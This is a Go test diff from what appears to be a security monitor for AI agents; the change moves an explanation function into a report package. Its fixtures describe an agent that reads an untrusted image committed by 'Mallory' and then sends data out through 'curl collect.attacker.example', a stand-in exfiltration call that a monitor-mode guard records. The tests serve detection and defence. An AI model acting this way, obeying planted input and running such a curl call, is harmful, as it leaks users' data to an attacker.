@@ -14,6 +14,7 @@ import (
 	"github.com/cavi-ai/secure-agent/daemon/internal/guard"
 	"github.com/cavi-ai/secure-agent/daemon/internal/model"
 	"github.com/cavi-ai/secure-agent/daemon/internal/posture"
+	"github.com/cavi-ai/secure-agent/daemon/internal/report"
 )
 
 const untrustedImageOrigin = "committed by Mallory <mallory@attacker.example> in repo@c405510 on 2026-10-28 (docs: add build spec diagram)"
@@ -74,7 +75,7 @@ func TestUntrustedEgressFindingReadsPlainly(t *testing.T) {
 		t.Fatalf("title = %q", got)
 	}
 	f := untrustedEgressFlag(time.Now(), "monitored")
-	what := explainWhat(f, &model.FlagExplain{}, nil)
+	what := report.ExplainWhat(f, &model.FlagExplain{}, nil)
 	want := posture.FamilyTitle("claude") + " read an image (build-spec.png) and 1 more untrusted input, then sent data out through curl collect.attacker.example. Guard: ran; monitor mode records it."
 	if what != want {
 		t.Fatalf("what = %q\nwant %q", what, want)
@@ -109,7 +110,7 @@ func TestUntrustedEgressFindingNamesEachInputKind(t *testing.T) {
 			{Kind: "send", Label: "curl collect.attacker.example", Sub: "ran; monitor mode records it", Rule: "monitored"},
 		}}
 		want := posture.FamilyTitle("claude") + " read " + tc.want + ", then sent data out through curl collect.attacker.example. Guard: ran; monitor mode records it."
-		if got := explainWhat(f, &model.FlagExplain{}, nil); got != want {
+		if got := report.ExplainWhat(f, &model.FlagExplain{}, nil); got != want {
 			t.Fatalf("%s: what = %q\nwant %q", tc.kind, got, want)
 		}
 	}
